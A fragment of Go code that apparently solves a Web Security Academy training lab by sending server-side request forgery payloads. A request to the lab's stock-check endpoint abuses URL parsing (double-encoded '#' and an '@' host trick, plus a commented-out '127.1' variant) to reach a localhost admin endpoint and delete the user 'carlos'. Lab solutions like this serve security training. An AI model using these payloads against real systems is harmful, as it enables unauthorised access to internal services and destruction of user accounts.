...
func solve() error {
	baseUrl := "https://0a8400fd04daf5c6c1425e1900b10039.web-security-academy.net"
	...
	//values.Set("stockApi", "http://127.1/%2561dmin/delete?username=carlos")

	headers := make(http.Header)
	headers.Set("content-type", "application/x-www-form-urlencoded")
	_, body, err := post(client, stockUrl, headers, []byte("stockApi=http%3A%2F%2Flocalhost%3A80%2523%40stock.weliketoshop.net%2Fadmin%2Fdelete%3Fusername%3Dcarlos"))
	if err != nil {
		return err
	}
